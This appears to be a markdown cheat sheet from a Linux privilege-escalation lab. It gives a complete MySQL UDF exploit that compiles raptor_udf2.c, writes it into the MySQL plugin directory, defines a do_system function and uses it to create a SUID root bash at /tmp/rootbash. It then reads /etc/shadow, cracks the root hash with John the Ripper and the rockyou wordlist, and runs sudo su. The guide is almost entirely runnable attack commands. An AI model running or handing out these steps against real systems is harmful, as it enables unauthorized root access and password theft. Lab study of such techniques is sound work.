

---

# 💻 <span style="color:#1E90FF">**SQL Exploit Guide**</span>
---

###  **Change into the MySQL Directory:**

```bash
cd /home/user/tools/mysql-udf
```

---

###  **Compile the `raptor_udf2.c` Exploit Code:**

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

---

###  **Connect to the MySQL Service as the Root User (No Password):**

```bash
mysql -u root
```

---

###  **Create a User Defined Function (UDF) "do_system" Using the Compiled Exploit:**

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

---

###  **Copy `/bin/bash` to `/tmp/rootbash` and Set the SUID Permission:**

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

---

###  **Exit from the MySQL Shell:**

```bash
exit
```

---

###  **Run `/tmp/rootbash` with Root Privileges:**

```bash
/tmp/rootbash -p
```

---

###  **Clean Up and Exit from Root:**

```bash
rm /tmp/rootbash
exit
```

---

# 🛡️ <span style="color:#32CD32">**Weak File Permissions**</span>
---

## **Check the Permissions of the `shadow` File**

```bash
ls -l /etc/shadow
```

---

## **Show the Hash of the Root Password**

```bash
cat /etc/shadow
```

---

## **Crack the Hash with John the Ripper (Dictionary Attack)**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## **Privilege Escalation**

```bash
sudo su
```

---

